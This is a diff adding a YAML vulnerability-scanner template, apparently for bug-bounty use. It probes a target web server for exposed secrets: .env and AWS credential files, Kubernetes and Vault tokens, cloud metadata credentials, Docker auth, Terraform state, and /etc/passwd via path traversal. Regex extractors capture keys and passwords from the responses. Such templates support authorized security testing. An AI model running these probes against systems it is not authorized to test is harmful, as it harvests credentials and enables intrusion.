@@ -1,0 +1,136 @@
+id: ENV-UNIQUE-01
+name: Bug-Bounty Environment Exposure (Cloud, K8s, Vault)
+severity: high
+category: information-disclosure
+metadata:
+  cwe: CWE-538
+  tags: ["env", "secrets", "cloud", "kubernetes", "vault"]
+
+requests:
+  # --------------------------------------------------------------
+  # Stage 1: Standard env files (your existing)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.env.production"
+      - "{{BaseURL}}/.aws/credentials"
+      - "{{BaseURL}}/appsettings.json"
+      - "{{BaseURL}}/settings.py"
+      - "{{BaseURL}}/secret.yml"
+    matchers:
+      - type: status
+        status: 200
+    extractors:
+      - type: regex
+        name: extracted_secrets
+        regex:
+          - 'DATABASE_URL\s*=\s*[^\s]+'
+          - 'SECRET_KEY\s*=\s*[^\s]+'
+          - 'AWS_ACCESS_KEY_ID\s*=\s*[A-Z0-9]+'
+          - 'AWS_SECRET_ACCESS_KEY\s*=\s*[A-Za-z0-9/+]+'
+
+  # --------------------------------------------------------------
+  # Stage 2: Kubernetes service account token (if path traversal)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/var/run/secrets/kubernetes.io/serviceaccount/token"
+      - "{{BaseURL}}/run/secrets/kubernetes.io/serviceaccount/token"
+    matchers:
+      - type: word
+        words:
+          - "eyJhbGciOiJSUzI1NiIsImtpZCI6"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 3: HashiCorp Vault
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/.vault-token"
+      - "{{BaseURL}}/v1/sys/seal-status"
+    matchers:
+      - type: word
+        words:
+          - "sealed"
+          - "token"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 4: AWS / GCP / Azure Metadata (SSRF)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/computeMetadata/v1/instance/service-accounts/default/token"
+      - "{{BaseURL}}/metadata/instance?api-version=2017-08-01"
+    headers:
+      Metadata-Flavor: "Google"   # required for GCP
+    matchers:
+      - type: word
+        words:
+          - "AccessKeyId"
+          - "secret"
+          - "token"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 5: Docker config (registry auth)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/.docker/config.json"
+      - "{{BaseURL}}/.dockercfg"
+    matchers:
+      - type: word
+        words:
+          - "auths"
+          - "\"https://"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 6: /etc/passwd & /proc/self/environ (LFI vectors)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/passwd"
+      - "{{BaseURL}}/proc/self/environ"
+      - "{{BaseURL}}/../../../../etc/passwd"
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "PATH="
+          - "DB_PASSWORD"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 7: Terraform / Ansible state files
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/terraform.tfstate"
+      - "{{BaseURL}}/ansible/vars.yml"
+    matchers:
+      - type: word
+        words:
+          - "aws_access_key"
+          - "secret_key"
+          - "ansible_ssh_pass"
+        part: body
+
+  # --------------------------------------------------------------
+  # Stage 8: PHP info / server status (legacy)
+  # --------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/phpinfo.php"
+      - "{{BaseURL}}/server-status"
+    matchers:
+      - type: word
+        words:
+          - "PHP Version"
+          - "_ENV"
+          - "CPU"
+        part: body
